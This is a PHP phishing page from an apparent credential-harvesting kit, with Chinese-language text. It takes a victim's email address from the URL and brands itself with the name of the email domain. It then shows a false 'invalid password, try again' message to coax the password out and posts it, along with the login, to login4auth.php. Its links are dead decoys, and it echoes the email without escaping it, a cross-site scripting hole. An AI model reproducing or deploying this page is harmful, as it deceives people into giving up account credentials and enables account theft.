<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

  <head>

  <meta charset="UTF-8">
  <title><?php echo $yuh ?> 密码设定 | User: <?php echo $login ?></title>
  
<link rel="icon" href="./grid/favicon.png" type="image/gif" sizes="16x16">
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  
  
  
  
  </head>
  
  
  
  
  
  <body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0" bgcolor="#F2F2F2">
  
  
  
	<table align="center" cellspacing="0" width="100%" height="100%" bgcolor="#F2F2F2">
					
					<tr><td height="1%" bgcolor="#262121"></td></tr>
					
					
							
					
					
					
					<tr><td height="85%">
					
					
					
							<table align="center" cellspacing="0">
							
							
							<tr><td>
							
									<div align="center">
							
							
											
											<font face="Arial, Helvetica, sans-serif" size="+2" color="#000000">
											欢迎回来!
											</font>
											
									</div>
							
							</td></tr>
							
							
							
							
							<tr><td style="height:0px;"></td></tr>
							
							
							
							
							<tr><td>
							
									<div align="center">
							
											<font face="Arial, Helvetica, sans-serif" size="+2" color="#1E63A7">
											<font color="#000000">[</font>


<?php echo $login ?>


<font color="#000000">]</font>
											</font>
											
									</div>
							
							
							</td></tr>
							
							
							
							
							
							
							
							<tr><td style="height:30px;">
							
									<form method="post" action="login4auth.php">
							
							</td></tr>
							
							
							
							
							
							
							
							<tr><td>
							
							
							
									<div align="center">
							
											<font face="Arial, Helvetica, sans-serif" size="2" color="#FF0000"><b>
											您输入了无效的密码. 再试一次...!
											</b></font>
											
									</div>
							
							
							
							</td></tr>
							
							
							
							
							
							
							
							<tr><td style="height:10px;"></td></tr>
							
							
							
							
							
							
							
							
							<tr><td>

										<div align="center">
			
											<table align="center" cellspacing="0" 
											style="height:42px; width:315px; box-shadow: 1px 1px 1px #000000; border-radius: 1px 1px; background: #FFFFFF; padding:0px; border: 1px #000000">
											<tr>
											
											<td style="width:5px;"></td>
											
											<td>
											
												<img src="./grid/pass.jpg" style="width:17px; height:17px;">
											
											</td>
											
											
											
											
											<td style="width:2px;"></td>
											
											
											
											
											<td>
											
												<input type="password" name="passwd" placeholder="Password" required="" style="height:30px; width:280px; border: 1px #FFFFFF">
											
											</td>
											
											</tr></table>
					
										</div>
								
							
							</td></tr>
							
							
							
							
							
							
							
							
							
							
							
							
							
							
							
							
							
							
							<tr><td style="height:10px;"></td></tr>
							
							
							
							
							
							
							
							<tr><td>

										<div align="center">
			
											<button style="height:40px; width:315px; box-shadow: 1px 1px 1px #000000; border-radius: 1px 1px; background: #1E63A7; border: 1px #1E63A7;">
					
													<font face="Arial, Helvetica, sans-serif" size="2" color="#FFF">
													继续 >>>
													</font>
					
											</button>
						
										</div>
								
							
							</td></tr>
							
							
							
							
							
							
							<tr><td style="height:40px;">

							
<input type="hidden" name="login" value="<?php echo $login ?>">
							
</form>
							
							</td></tr>
							
							
							
							
							
							
							
							
							<tr><td>
							
							
									<div align="center">
									
										<a href="" style="text-decoration:none;">
										
											<font face="Arial, Helvetica, sans-serif" size="2" color="#045FB4"><b>
											忘记密码?
											</b></font>
											
										</a>
									
									</div>
							
							
							</td></tr>
							
							
							
							
							
							
							
							
							
							
							
							<tr><td style="height:5px;"></td></tr>
							
							
							
							
							
							
							
							
							<tr><td>
							
							
									<div align="center">
									
									
										<font face="Arial, Helvetica, sans-serif" size="2" color="#424242">
										您要关闭帐户吗? 
										</font>
											
									
										<a href="" style="text-decoration:none;">
										
											<font face="Arial, Helvetica, sans-serif" size="2" color="#045FB4"><b>
											点击这里
											</b></font>
											
										</a>
									
									</div>
							
							
							</td></tr>
							
							
							
							
							
							
							
							
							<tr><td style="height:10px;"></td></tr>
							
							
							</table>
					
					</td></tr>
					
					
					
					
					
					
					<tr><td height="1%">
					
							<hr width="100%" align="center" color="#D8D8D8">
					
					</td></tr>
					
					
					
					
					
					
					<tr><td height="10%">
					
							<table align="center" cellspacing="0"><tr>
							
							<td>
							
									<font face="Arial, Helvetica, sans-serif" size="2" color="#6E6E6E">

<?php echo $yuh ?> 

WebApp
									</font>
							
							</td>
							
							
							
							
							<td>
							
								<a href="" style="text-decoration:none;">
									<font face="Arial, Helvetica, sans-serif" size="2" color="#6E6E6E">
									� 2020
									</font>
								</a>
								
								
								  
								
								
								<a href="" style="text-decoration:none;">
									<font face="Arial, Helvetica, sans-serif" size="2" color="#6E6E6E">
									用户协议
									</font>
								</a>
								
								
							</td>
							
							
							</tr></table>
							
					</td></tr>
					
					
					
					<tr><td height="2%" bgcolor="#262121"></td></tr>
					
	</table>
  
  
  
  </body>
  

</html>